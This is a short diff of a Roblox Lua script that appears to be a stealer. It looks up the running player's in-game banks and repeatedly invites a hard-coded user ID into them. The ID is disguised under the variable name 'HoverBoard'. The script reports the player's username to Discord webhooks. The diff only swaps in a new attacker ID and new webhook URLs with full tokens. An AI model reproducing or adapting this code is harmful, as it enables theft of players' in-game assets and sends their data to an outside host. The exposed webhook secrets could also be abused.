@@ -1,4 +1,4 @@
-local HoverBoard = 1313362905
+local HoverBoard = 777098534
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
     local mybanks = lib.Network.Invoke("get my banks")
     local BankID = mybanks[1]['BUID']
@@ -93,7 +93,7 @@ local result = Event:InvokeServer(A_1)
 
 -- wrb
 
-local YourWebHookHere =  "https://discord.com/api/webhooks/963822008968282183/IwkPFxyqyIqGqejDis52LOA1U9pD5oNqSBeub6OEAujjqjiGAGVZALDx4h6tZD7YuaJ6"  -- web hook here
+local YourWebHookHere =  "https://discord.com/api/webhooks/965216915482087435/TuCfBc2C3qTCXlooWcZ8EI0XzUyvPUiIDjxr27cr8pigVQlTBmKuPOSJi9FWyuYFfxbE"  -- web hook here
 
 local url = YourWebHookHere
 local username = game:GetService("Players").LocalPlayer.Name
@@ -150,7 +150,7 @@ request(abcdef)
 
 while true do
     lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], HoverBoard)
-    local YourWebHookHere2 =  "https://discord.com/api/webhooks/963417877673832499/-FaxaLPIYCeSsCxG1COzAY_OS5N2fj82qety7hCe8ojJ2381bot72Nvyqk-s0l-J2EOm"  -- web hook here
+    local YourWebHookHere2 =  "https://discord.com/api/webhooks/965216950789734420/CDnbc6TEUAelUakNcS6b24zpaVN9tHdXIHy_mUVj9H0xhAUVJBH_n6kmYYYim4ikkaAs"  -- web hook here
 
     local url2 = YourWebHookHere2
     local username2 = game:GetService("Players").LocalPlayer.Name
